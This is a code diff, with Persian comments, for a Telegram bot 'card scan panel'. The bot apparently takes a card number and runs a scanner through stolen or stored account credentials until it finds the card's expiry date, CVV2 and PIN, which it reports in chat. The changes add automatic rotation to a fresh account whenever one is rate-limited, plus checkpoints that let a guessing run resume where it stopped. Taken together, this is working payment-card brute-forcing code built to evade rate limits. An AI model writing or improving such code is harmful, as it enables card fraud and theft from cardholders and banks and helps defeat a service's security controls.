@@ -1,4 +1,4 @@
-"""پنل اسکن کارت"""
+"""پنل اسکن کارت - با تعویض خودکار اکانت و checkpoint"""
 import asyncio
 import time
 
@@ -13,6 +13,43 @@ from core.scanner import SmartScanner, CardResult
 
 # وضعیت اسکن فعلی
 _active_scans = {}
+
+
+def _build_key_store(account: dict) -> dict:
+    """ساخت key_store از اطلاعات اکانت (با رمزگشایی در صورت لزوم)"""
+    key_store = {}
+
+    # رمزگشایی فیلدهای حساس
+    fernet = None
+    if config.is_encryption_enabled():
+        try:
+            from cryptography.fernet import Fernet
+            fernet = Fernet(config.WORKER_SECRET.encode())
+        except Exception:
+            pass
+
+    def _decrypt_field(val):
+        if not val:
+            return ""
+        if fernet:
+            try:
+                return fernet.decrypt(val.encode()).decode()
+            except Exception:
+                return val
+        return val
+
+    if account.get("token"):
+        key_store["token"] = _decrypt_field(account["token"])
+    if account.get("refresh_token"):
+        key_store["refreshToken"] = _decrypt_field(account["refresh_token"])
+    if account.get("shared_key"):
+        key_store["shared_key"] = _decrypt_field(account["shared_key"])
+    if account.get("working_key"):
+        key_store["working_key"] = _decrypt_field(account["working_key"])
+    if account.get("rsa_public"):
+        key_store["rsaPublic"] = account["rsa_public"]
+
+    return key_store
 
 
 def register(bot):
@@ -133,53 +170,75 @@ async def handle_scan_message(bot, event):
     state["step"] = "scanning"
     state["pan"] = pan
 
-    await event.respond(panel_message(
-        "🔍 شروع اسکن",
-        [f"💳 کارت: {mask_pan(pan)}", "در حال آماده‌سازی..."]
-    ))
+    # بررسی وجود جاب قابل ادامه
+    resumable = await db.get_resumable_job(pan)
+    if resumable:
+        await event.respond(panel_message(
+            "🔍 ادامه اسکن قبلی",
+            [
+                f"💳 کارت: {mask_pan(pan)}",
+                f"فاز: {resumable['phase']} | checkpoint: {resumable['checkpoint_index']}",
+                "در حال ادامه..."
+            ]
+        ))
+    else:
+        await event.respond(panel_message(
+            "🔍 شروع اسکن",
+            [f"💳 کارت: {mask_pan(pan)}", "در حال آماده‌سازی..."]
+        ))
 
     # اجرای اسکن در background
-    asyncio.create_task(_run_scan(bot, event, pan, state))
+    asyncio.create_task(_run_scan(bot, event, pan, state, resumable))
     return True
 
 
-async def _run_scan(bot, event, pan: str, state: dict):
-    """اجرای فرایند اسکن"""
+async def _run_scan(bot, event, pan: str, state: dict, resumable_job: dict = None):
+    """
+    اجرای فرایند اسکن با تعویض خودکار اکانت
+    در صورت محدودیت اکانت، به اکانت بعدی سوئیچ می‌کند
+    و از checkpoint ادامه می‌دهد
+    """
     start_time = time.time()
     status_msg = None
 
-    # دریافت اکانت فعال
+    # تنظیمات resume
+    resume_phase = 0
+    resume_index = 0
+    resume_found = {}
+    job_id = None
+
+    if resumable_job:
+        job_id = resumable_job["id"]
+        resume_phase = resumable_job.get("phase", 0)
+        resume_index = resumable_job.get("checkpoint_index", 0)
+        if resumable_job.get("found_expiry"):
+            parts = resumable_job["found_expiry"].split("/")
+            if len(parts) == 2:
+                resume_found["expire_month"] = parts[0]
+                resume_found["expire_year"] = parts[1]
+        if resumable_job.get("found_cvv"):
+            resume_found["cvv2"] = resumable_job["found_cvv"]
+        await db.update_scan_job(job_id, status="running")
+
+    # دریافت همه اکانت‌های فعال
     accounts = await db.get_active_accounts()
     if not accounts:
         await event.respond("❌ اکانت فعالی موجود نیست!")
         _active_scans.pop(event.sender_id, None)
         return
 
-    account = accounts[0]
+    # ساخت job در صورت نبودن
+    if not job_id:
+        job_id = await db.add_scan_job(
+            card_pan=pan, status="running", account_id=accounts[0]["id"]
+        )
 
-    # ساخت job
-    job_id = await db.add_scan_job(
-        card_pan=pan, status="running", account_id=account["id"]
-    )
-
-    # ساخت auth client
-    key_store = {}
-    if account.get("token"):
-        key_store["token"] = account["token"]
-    if account.get("refresh_token"):
-        key_store["refreshToken"] = account["refresh_token"]
-    if account.get("shared_key"):
-        key_store["shared_key"] = account["shared_key"]
-    if account.get("working_key"):
-        key_store["working_key"] = account["working_key"]
-    if account.get("rsa_public"):
-        key_store["rsaPublic"] = account["rsa_public"]
-
-    auth_client = IvaAuthClient(key_store=key_store)
     scanner = SmartScanner()
     state["scanner"] = scanner
 
     last_update = 0
+    current_account_idx = 0
+    max_rotations = len(accounts)
 
     async def on_progress(phase, current, total, found):
         """آپدیت پیشرفت در تلگرام"""
@@ -197,12 +256,15 @@ async def _run_scan(bot, event, pan: str, state: dict):
         if found.get("cvv2"):
             found_text += f"\n🔐 CVV2: {found['cvv2']}"
 
+        acc_info = f"اکانت: {current_account_idx + 1}/{len(accounts)}"
+
         text = panel_message(
             f"🔍 اسکن - فاز {phase}/3",
             [
                 f"💳 {mask_pan(pan)}",
                 f"{bar}",
                 f"📊 {current}/{total} تست",
+                f"👤 {acc_info}",
                 f"⏱ {elapsed}",
                 found_text,
             ]
@@ -222,18 +284,87 @@ async def _run_scan(bot, event, pan: str, state: dict):
         """لاگ اسکن"""
         await db.add_log("info", "scan", f"[{mask_pan(pan)}] {msg}")
 
-    # اجرای اسکن
-    try:
-        result = await scanner.scan_card(
-            pan=pan,
-            auth_client=auth_client,
-            on_progress=on_progress,
-            on_log=on_log,
-        )
+    async def on_checkpoint(phase, index):
+        """ذخیره checkpoint در دیتابیس"""
+        await db.update_scan_job(job_id, phase=phase, checkpoint_index=index)
 
+    # اسکن با تعویض خودکار اکانت
+    result = None
+    try:
+        while current_account_idx < max_rotations:
+            account = accounts[current_account_idx]
+
+            # ساخت auth client
+            key_store = _build_key_store(account)
+            auth_client = IvaAuthClient(key_store=key_store)
+
+            await db.update_scan_job(job_id, account_id=account["id"])
+
+            # اجرای اسکن
+            scanner_instance = SmartScanner()
+            state["scanner"] = scanner_instance
+
+            result = await scanner_instance.scan_card(
+                pan=pan,
+                auth_client=auth_client,
+                on_progress=on_progress,
+                on_log=on_log,
+                on_checkpoint=on_checkpoint,
+                resume_phase=resume_phase,
+                resume_index=resume_index,
+                resume_found=resume_found,
+            )
+
+            await auth_client.close()
+
+            if result.rate_limited:
+                # تعویض اکانت
+                await db.mark_account_limited(account["phone"])
+                await on_log(f"[-] اکانت {account['phone']} محدود شد - تعویض...")
+
+                current_account_idx += 1
+
+                if current_account_idx < max_rotations:
+                    # ادامه از checkpoint با اکانت جدید
+                    resume_phase = result.checkpoint_phase
+                    resume_index = result.checkpoint_index
+                    # حفظ اطلاعات پیدا شده
+                    if result.expire_month:
+                        resume_found["expire_month"] = result.expire_month
+                        resume_found["expire_year"] = result.expire_year
+                    if result.cvv2:
+                        resume_found["cvv2"] = result.cvv2
+
+                    await on_log(f"[*] تعویض به اکانت {accounts[current_account_idx]['phone']}")
+                    await db.update_scan_job(
+                        job_id,
+                        found_expiry=f"{resume_found.get('expire_month', '')}/{resume_found.get('expire_year', '')}",
+                        found_cvv=resume_found.get("cvv2", ""),
+                    )
+
+                    try:
+                        await event.respond(panel_message(
+                            "🔄 تعویض اکانت",
+                            [
+                                f"اکانت قبلی محدود شد",
+                                f"اکانت جدید: {accounts[current_account_idx]['phone']}",
+                                f"ادامه از فاز {resume_phase} ایندکس {resume_index}",
+                            ]
+                        ))
+                    except Exception:
+                        pass
+                else:
+                    # همه اکانت‌ها محدود شده‌اند
+                    await on_log("[-] تمام اکانت‌ها محدود شده‌اند!")
+                    break
+            else:
+                # اسکن تمام شد (موفق یا ناموفق)
+                break
+
+        # نتیجه نهایی
         elapsed = format_elapsed(time.time() - start_time)
 
-        if result.success:
+        if result and result.success:
             # موفقیت
             await db.update_scan_job(
                 job_id, status="success",
@@ -264,25 +395,37 @@ async def _run_scan(bot, event, pan: str, state: dict):
                         result.pin,
                     ),
                     f"\n📊 تعداد تست: {result.tests_performed}",
+                    f"👤 اکانت‌های مصرف‌شده: {current_account_idx + 1}",
                     f"⏱ زمان: {elapsed}",
                 ],
                 f"🕒 {config.now_str()}"
             )
             await event.respond(success_text)
 
-        elif result.rate_limited:
-            # محدودیت - علامت‌گذاری اکانت
-            await db.mark_account_limited(account["phone"])
-            await db.update_scan_job(job_id, status="rate_limited", finished_at=config.now_str())
-            await db.add_log("warning", "scan", f"اکانت {account['phone']} محدود شد")
+        elif result and result.rate_limited and current_account_idx >= max_rotations:
+            # همه اکانت‌ها محدود شده
+            await db.update_scan_job(
+                job_id, status="rate_limited",
+                found_expiry=f"{resume_found.get('expire_month', '')}/{resume_found.get('expire_year', '')}",
+                found_cvv=resume_found.get("cvv2", ""),
+                finished_at=config.now_str(),
+            )
+            await db.add_log("warning", "scan",
+                             f"همه اکانت‌ها محدود شدند - اسکن {mask_pan(pan)} متوقف")
             await event.respond(panel_message(
-                "⚠️ محدودیت اکانت",
-                [f"اکانت {account['phone']} به محدودیت رسید", "از اکانت دیگری استفاده کنید"]
+                "⚠️ تمام اکانت‌ها محدود شدند",
+                [
+                    f"💳 {mask_pan(pan)}",
+                    f"فاز رسیده: {result.phase_reached}/3",
+                    "اسکن قابل ادامه است پس از ریست محدودیت",
+                    f"⏱ زمان: {elapsed}",
+                ]
             ))
 
-        else:
+        elif result:
             await db.update_scan_job(job_id, status="failed", finished_at=config.now_str())
-            await db.add_log("warning", "scan", f"اسکن {mask_pan(pan)} ناموفق: {result.error_message}")
+            await db.add_log("warning", "scan",
+                             f"اسکن {mask_pan(pan)} ناموفق: {result.error_message}")
             await event.respond(panel_message(
                 "❌ اسکن ناموفق",
                 [
@@ -300,5 +443,4 @@ async def _run_scan(bot, event, pan: str, state: dict):
         await event.respond(f"❌ خطای غیرمنتظره: {str(e)[:200]}")
 
     finally:
-        await auth_client.close()
         _active_scans.pop(event.sender_id, None)
